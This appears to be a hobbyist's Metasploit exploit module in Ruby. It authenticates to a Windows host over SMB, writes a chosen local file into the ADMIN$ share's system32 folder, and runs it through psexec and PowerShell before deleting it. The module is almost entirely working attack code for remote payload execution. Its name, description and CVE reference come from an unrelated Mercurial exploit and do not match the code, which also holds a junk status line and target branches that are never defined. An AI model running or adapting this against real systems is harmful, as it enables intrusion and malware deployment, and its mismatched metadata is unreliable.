  ##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Auxiliary::Report


  def initialize(info={})
    super(update_info(info,
      'Name'           => "Darkfowl's epic metasploit script",
      'Description'    => %q{
        This module takes advantage of custom hg-ssh wrapper implementations that don't
        adequately validate parameters passed to the hg binary, allowing users to trigger a
        Python Debugger session, which allows arbitrary Python code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 
        [
          'claudijd',
        ],
      'References'     =>
        [
          [ 'CVE', '2017-9462' ],
          ['URL',   'https://www.mercurial-scm.org/wiki/WhatsNew#Mercurial_4.1.3_.282017-4-18.29']
        ],
      'DefaultOptions' =>
        {
          'Payload' => 'cmd/unix/generic',
		  'cmd' 	=> 'echo hi'
        },
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        => [ ['Automatic', {}] ],
      'Privileged'     => false,
      'DisclosureDate' => "Apr 18 2017",
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        OptString.new('SHARE',     [ true, "The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share", 'ADMIN$' ]),
		OptString.new('REMOTELOCATION', [ false, 'Where the file will go', '']),
        OptString.new('LOCALLOCATION', [ false, 'Where the file is from', ''])
      ]
    )

    register_advanced_options(
      [
        OptString.new('SERVICE_FILENAME', [false, "Filename to to be used on target for the service binary",nil]),
        OptString.new('PSH_PATH', [false, 'Path to powershell.exe', 'Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe']),
      ]
    )
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def remote_location
    datastore['REMOTELOCATION']
  end

  def local_location
    datastore['LOCALLOCATION']
  end
  def dst_path
  	File.dirname(remote_location)
	end

  def exploit
    print_status("Connecting to the server...")
    connect(versions: [2,1])

    print_status("Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...")
    smb_login

    if not simple.client.auth_user and not datastore['ALLOW_GUEST']
      print_line(" ")
      print_error(
        "FAILED! The remote host has only provided us with Guest privileges. " +
        "Please make sure that the correct username and password have been provided. " +
        "Windows XP systems that are not part of a domain will only provide Guest privileges " +
        "to network logins by default."
      )
      print_line(" ")
      disconnect
      return
    end

    
	print_status("yyyyyyyyyyyyyyyyeeeeeeeeee")

    case target.name
    when 'Automatic'
      if powershell_installed?(datastore['SHARE'], datastore['PSH_PATH'])
        print_status('Selecting PowerShell target')
       true_upload(datastore['SHARE'])
      else
        print_status('Selecting native target')
        true_upload(datastore['SHARE'])
      end
    when 'PowerShell'
      true_upload(datastore['SHARE'])
    when 'Native upload'
      true_upload(datastore['SHARE'])
    when 'MOF upload'
      true_upload(datastore['SHARE'])
    end

    handler
    disconnect
  end
    
	
	
	 def true_upload(smb_share)
    share = "\\\\#{datastore['RHOST']}\\ADMIN$"
    filename = remote_location

    # payload as exe
    print_status("Uploading Payload...")
    if smb_share != 'ADMIN$'
      print_error('Wbem will only work with ADMIN$ share')
      return
    end
    simple.connect(share)
	data = ""
    File.open( local_location ) { |f|
    data += f.read
	}
    exe = data
    fd = smb_open("\\system32\\#{filename}", 'rwct', write: true)
    fd << exe
    fd.close
    print_status("Created %SystemRoot%\\system32\\#{filename}")
	psexec("powershell  \"& \"\"C:\\Windows\\system32\\#{filename}\"\"\"")
	psexec("del /f C:\\Windows\\system32\\#{filename}")


    # Disconnect from the ADMIN$
    simple.disconnect(share)
  end
end
